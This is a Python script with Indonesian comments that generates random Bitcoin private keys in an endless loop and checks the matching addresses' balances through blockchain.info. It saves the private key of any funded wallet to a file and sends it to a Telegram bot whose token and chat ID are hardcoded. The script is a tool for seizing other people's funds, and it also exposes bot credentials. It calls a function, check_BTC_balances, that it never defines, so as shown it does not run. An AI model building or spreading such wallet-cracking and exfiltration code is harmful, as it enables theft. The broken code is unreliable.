from bitcoin import *
import aiohttp
import asyncio
import random
import os
from dotenv import load_dotenv

# Memuat file .env yang berisi nama server
load_dotenv()

# Mendapatkan nama server dari environment variable
SERVER_NAME = os.getenv("SERVER_NAME", "Unknown Server")

# Telegram bot token dan chat ID
TELEGRAM_TOKEN = "6789484876:AAFR1OQRssKGrk8aIF0jAn0zB3eWF33XtrE"
TELEGRAM_CHAT_ID = "-4562112556"

# Fungsi untuk mengirim pesan ke Telegram
async def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=payload) as response:
            if response.status == 200:
                print("Message sent to Telegram successfully!")
            else:
                print(f"Failed to send message to Telegram. Status: {response.status}")

# Fungsi untuk generate 100 alamat Bitcoin secara acak
def generate_addresses(num_addresses=200):
    addresses = []
    for _ in range(num_addresses):
        private_key = random_key()  # Generate private key
        address = pubkey_to_address(privtopub(private_key))  # Generate address dari public key
        addresses.append((address, private_key))  # Simpan dalam bentuk tuple (address, private_key))
    return addresses

# Fungsi untuk mengambil saldo dari 100 alamat sekaligus
async def fetch_balances(session, addresses, max_retries=5, rate_limit_counter=None):
    address_list = "|".join([addr[0] for addr in addresses])
    url = f"https://blockchain.info/balance?active={address_list}"
    retries = 0

    while retries < max_retries:
        try:
            async with session.get(url) as response:
                if response.status == 429:
                    print("Rate limit exceeded. Waiting before retrying...")
                    if rate_limit_counter is not None:
                        rate_limit_counter['429'] += 1  # Tambahkan ke counter 429
                    await asyncio.sleep(3600)  # Tunggu sebelum retry
                    retries += 1
                    continue
                response.raise_for_status()  # Raise jika status selain 200
                data = await response.json()
                return data
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Connection error: {e}. Retrying ({retries + 1}/{max_retries})...")
            retries += 1
            await asyncio.sleep(5)

    print("Max retries exceeded. Skipping this batch.")
    return {}

# Fungsi utama
async def main():
    counter = 0
    found_counter = 0  # Counter untuk alamat dengan saldo
    rate_limit_counter = {'429': 0}  # Counter untuk error 429

    while True:
        counter += 1
        print(f"Starting session #{counter} on {SERVER_NAME}")
        addresses = generate_addresses(200)

        # Periksa saldo dari address
        balances = await check_BTC_balances(addresses, rate_limit_counter)

        if not balances:
            continue

        for (address, private_key) in addresses:
            balance = balances.get(address, {}).get("final_balance", 0)
            print(f"{counter} - {address} {balance / 100000000} BTC")

            if balance > 0:
                found_counter += 1
                file_info = f"[{SERVER_NAME}]\nAddress: {address}\nPrivateKey: {private_key}\nBalance: {balance / 100000000} BTC\n"
                
                with open("FoundWallet.txt", "a") as file:
                    file.write(file_info)

                await send_telegram_message(file_info)

        session_summary = f"[{SERVER_NAME}]\nSession #{counter} complete.\nFound: {found_counter}\n429 Errors: {rate_limit_counter['429']}"
        await send_telegram_message(session_summary)

        await asyncio.sleep(5)

# Menjalankan program utama
asyncio.run(main())
